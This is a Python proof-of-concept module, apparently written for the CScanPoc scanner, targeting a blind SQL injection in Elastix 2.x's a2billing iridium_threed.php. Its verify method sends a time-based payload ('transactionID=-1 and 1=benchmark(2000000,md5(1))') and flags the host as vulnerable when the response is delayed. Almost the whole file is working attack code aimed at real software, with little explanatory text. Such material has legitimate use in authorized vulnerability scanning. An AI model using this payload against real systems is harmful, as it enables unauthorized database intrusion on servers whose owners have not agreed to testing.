# coding: utf-8
import re
import time
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Elastix_0101'  # 平台漏洞编号，留空
    name = 'Elastix 2.x /a2billing/customer/iridium_threed.php BLIND SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-06'  # 漏洞公布时间
    desc = '''
    Vulnerable Source Code snippet in "a2billing/customer/iridium_threed.php".
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/36305/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Elastix'  # 漏洞应用名称
    product_version = '2.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5151973b-258b-4095-9d35-1207529060d7'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/a2billing/customer/iridium_threed.php'
            payload = '?transactionID=-1 and 1=benchmark(2000000,md5(1))'
            start_time = time.time()
            req = requests.get(verify_url + payload)
            if req.status_code == 200 and time.time() - start_time > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
